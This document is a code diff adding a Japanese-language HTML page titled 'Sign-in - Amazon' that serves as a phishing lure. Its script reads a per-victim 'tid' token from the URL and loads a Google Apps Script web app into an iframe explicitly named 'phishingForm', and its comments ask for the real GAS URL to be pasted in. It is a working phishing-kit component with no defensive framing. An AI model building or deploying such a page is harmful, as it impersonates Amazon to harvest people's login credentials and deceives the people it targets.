@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <base target="_top">
+  <meta charset="UTF-8" />
+  <title>サインイン - Amazon</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<iframe id="phishingForm" src=""></iframe>
+  <script>
+  // ページ読み込み後にクエリパラメータを取得してフォームのactionを設定
+  window.addEventListener('DOMContentLoaded', function() {
+    // 現在のURLのパラメータを解析
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('tid');   // ?tid=xxx を取得
+
+    // ここに実際のGASのWebアプリURLを貼り付けてください
+    const GAS_BASE_URL = "https://script.google.com/macros/s/XXXXX/exec?mode=form&token=";
+
+    // tokenが取得できた場合はフォームactionを動的に設定
+    if (token) {
+      document.getElementById('phishingForm').src = GAS_BASE_URL + encodeURIComponent(token);
+    } else {
+      // tokenが無い場合は、デフォルトの値やエラー処理を行う
+      document.getElementById('phishingForm').src = GAS_BASE_URL + "notoken";
+    }
+  });
+  </script>
+</body>
+</html>
